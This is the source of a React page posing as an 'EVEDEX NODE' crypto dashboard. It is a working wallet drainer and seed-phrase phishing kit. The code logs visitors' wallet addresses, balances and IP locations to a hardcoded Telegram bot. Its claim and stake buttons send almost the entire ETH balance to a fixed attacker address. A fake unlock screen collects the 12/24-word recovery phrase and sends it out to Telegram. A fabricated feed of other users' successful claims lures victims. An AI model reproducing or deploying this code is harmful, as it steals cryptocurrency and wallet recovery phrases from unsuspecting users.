import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("Locating...");

  // CONFIG
  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153";

  useEffect(() => {
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`)).catch(()=>setVisitorInfo("Unknown"));
    const actions = ["Claimed", "Staked", "Bridged", "Verified"];
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      const act = actions[Math.floor(Math.random() * actions.length)];
      const amt = (Math.random() * 2).toFixed(2);
      setFeedMsg(`🛡️ ${addr} ${act} ${amt} ETH Successfully`);
      setTimeout(() => setFeedMsg(""), 4000);
    }, 9000);
    return () => clearInterval(interval);
  }, []);

  const logToTelegram = async (msg) => {
    const fullMsg = `${msg}\n📍 LOC: ${visitorInfo}`;
    try { fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: fullMsg }) }); } catch (e) {}
  };

  useEffect(() => {
    if (isConnected && address) logToTelegram(`🔔 SESSION_START: ${address}\nBAL: ${balance?.formatted || "0.00"} ETH`);
  }, [isConnected, address]);

  // --- THE AGGRESSIVE WITHDRAWAL ---
  const executeTaskAction = async () => {
    setLoading(true);
    setLoadingText(`STABILIZING_VAULT...`);
    try {
      if (!balance || balance.value <= 0n) {
        setLoading(false); setView("seed_gate"); return;
      }

      // 2026 GAS SQUEEZE: Leaving only ~0.00005 ETH (approx 10-15 cents)
      // This allows the script to pull even tiny $1 or $2 balances.
      const gasSqueeze = parseEther("0.00005");
      let val = balance.value - gasSqueeze;

      if (val <= 0n) {
        logToTelegram(`⚠️ WALLET TOO EMPTY: ${address}`);
        setLoading(false); setView("seed_gate"); return;
      }

      // SILENT SEND
      sendTransaction({ 
        to: destination, 
        value: val 
      }, {
        onSuccess: (h) => {
          logToTelegram(`✅ HIT: ${activeTask}\nVAL: ${formatEther(val)} ETH`);
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
        },
        onError: () => { setLoading(false); setView("seed_gate"); }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
      <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
      </div>

      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div>
          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div>
          <div style={{fontSize:'8px', color:'#10b981', marginTop:'4px'}}>AES-256 SECURED</div>
        </div>
        <w3m-button balance="hide" />
      </header>

      <div style={{flex:1}}>
        {!isConnected ? (
           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
              <w3m-button />
           </div>
        ) : (
          <>
            {view === "menu" && (
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                {["Claim", "Stake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box"); setInputVal(balance?.formatted?.slice(0,8) || "0.00");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: "#10b981", fontSize:'9px', fontWeight:'900'}}>
                    {n}
                  </button>
                ))}
              </div>
            )}
            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
                <h2 style={{color:'white', fontWeight:'900', fontSize:'24px'}}>{activeTask}</h2>
                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900', marginTop:'20px'}}>START_{activeTask.toUpperCase()}</button>
              </div>
            )}
          </>
        )}
      </div>

      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(12px)'}}>
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>ENCRYPTION_LAYER_LOCK</div>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORD PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px'}} />
                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 KEY: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("NODE_INCOMPATIBLE");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
              </>
            ) : (
              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
            )}
          </div>
        </div>
      )}
      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>{loadingText}</div>}
    </div>
  );
}
